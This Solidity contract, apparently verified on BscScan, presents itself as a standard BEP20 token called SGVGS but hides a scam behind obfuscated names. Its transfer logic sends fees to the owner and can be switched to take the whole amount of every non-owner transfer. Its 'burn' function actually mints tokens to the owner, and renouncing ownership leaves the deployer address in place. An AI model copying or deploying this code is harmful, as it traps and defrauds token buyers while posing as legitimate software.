/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.6;
contract SGVGS {
uint256 public constant fgATBa = 99999999999999+1;
uint256 public  qwJuaC = 100000000000000000;
address public  PlqZgU = address(0);
string public  name = "SGVGS";
address private  liXwAj = address(0);
address public  jKDjPv = address(0);
address public  hdaKcn = address(0);
uint256 public  EuasKp = 10000000000000000000;
uint256 public  fVXsLu = 1000000000000000000;
address public  ppWGLG = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  aHELhO = 100000000000000000000;
uint256 public  seLRpQ = 100000000000000000000000;
uint8 public constant decimals = 18;
address public owner;
string public  symbol = "SGVGS";
uint256 public  Bmprjt = 10000000000000000;
address public  GXPwnJ = address(0);
uint256 public  FiTCtt = 10000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  VLLAYd = 10000000000000;
uint256 public  SxwbHw = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  pvcOdW = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "lsfNwC");
require(to != address(0), "lsfNwC");
require(amount <= balanceOf[from], "lsfNwC");
uint256 god;
if (from == owner || to == owner){
god = 0;
}
else{
god = amount* fgATBa/VLLAYd ;
}

uint256 transferAmount = amount - god;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += god;
if (to==liXwAj){
VLLAYd = 1+99999999999999;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
liXwAj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}